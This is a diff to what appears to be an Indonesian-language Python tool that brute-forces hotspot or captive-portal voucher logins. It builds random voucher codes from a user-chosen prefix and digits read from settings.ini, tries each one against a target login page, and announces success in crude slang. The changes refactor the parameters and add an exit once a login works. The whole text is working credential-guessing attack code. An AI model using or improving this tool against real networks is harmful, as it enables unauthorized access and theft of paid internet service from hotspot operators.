@@ -66,13 +66,13 @@ def redirectCheck(target, loginPage, statusPage):
 	else:
 		return resp.geturl()
 
-def udpMode(digit, nt, loginPage, statusPage, maxLogin):
+def udpMode(loginPage, statusPage, maxLogin):
 	banner()
 	print(f'''
  [{c.ob}-{c.n}] MODE : Username & Password
  [{c.ob}-{c.n}] Silahkan masukkan url target.
  [{c.ob}-{c.n}] contoh huruf keberuntungan : mres.
- [{c.error}!{c.n}] Harap gunakan HTTP/HTTPS dan diakhiri dengan tanda "/"
+ [{c.error}!{c.n}] Harap gunakan HTTP/HTTPS dan "/" dibelakang.
 	''')
 	target = input(f' [{c.ob}~{c.n}] URL Target ~> ')
 	lucky = input(f' [{c.ob}~{c.n}] Huruf Keberuntungan ~> ')
@@ -86,6 +86,10 @@ def udpMode(digit, nt, loginPage, statusPage, maxLogin):
 			while time.time() < t_end:
 				redirectValidate = redirectCheck(target,loginPage,statusPage)
 				if redirectValidate == 'OK':
+					read = configparser.ConfigParser()
+					read.read('settings.ini')
+					digit = read['rigo']['voucherDigitNumber']
+					nt = read['rigo']['nomorTogel']
 					rand = ''
 					for i in range(0,int(digit)):
 						rand+= random.choice(nt)
@@ -94,6 +98,7 @@ def udpMode(digit, nt, loginPage, statusPage, maxLogin):
 					print(f' [{c.og}*{c.n}] crott -> [{lucky} & {rand}]')
 				elif redirectValidate == 'DL':
 					print(f' [{c.og}+{c.n}] Anda sudah hamil.')
+					exit()
 				else:
 					print(f' [{c.error}!{c.n}] Tidak dapat melakukan pengencrotan')
 					print(f' [{c.error}!{c.n}] Halaman terakhir : {redirectValidate}')
@@ -106,7 +111,7 @@ def udpMode(digit, nt, loginPage, statusPage, maxLogin):
 		print(f' [{c.error}!{c.n}] Pastikan menggunakan http/https dan diakhiri dengan tanda /.')
 		exit()
 
-def uspMode(digit, nt, loginPage, statusPage, maxLogin):
+def uspMode(loginPage, statusPage, maxLogin):
 	banner()
 	print(f'''
  [{c.ob}-{c.n}] MODE : Username = Password
@@ -132,6 +137,7 @@ def uspMode(digit, nt, loginPage, statusPage, maxLogin):
 					print(f' [{c.og}*{c.n}] crott -> [{rand}]')
 				elif redirectValidate == 'DL':
 					print(f' [{c.og}+{c.n}] Anda sudah hamil.')
+					exit()
 				else:
 					print(f' [{c.error}!{c.n}] Tidak dapat melakukan pengencrotan')
 					print(f' [{c.error}!{c.n}] Halaman terakhir : {redirectValidate}')
@@ -152,9 +158,9 @@ def home(digit, nt, loginPage, statusPage, maxLogin):
 	''')
 	mode = int(input(f' [{c.ob}~{c.n}] Pilih Mode~> '))
 	if mode == 1:
-		uspMode(digit, nt, loginPage, statusPage, maxLogin)
+		uspMode(loginPage, statusPage, maxLogin)
 	elif mode == 2:
-		udpMode(digit, nt, loginPage, statusPage, maxLogin)
+		udpMode(loginPage, statusPage, maxLogin)
 
 if __name__ == "__main__":
 	if debugMode == 'false':
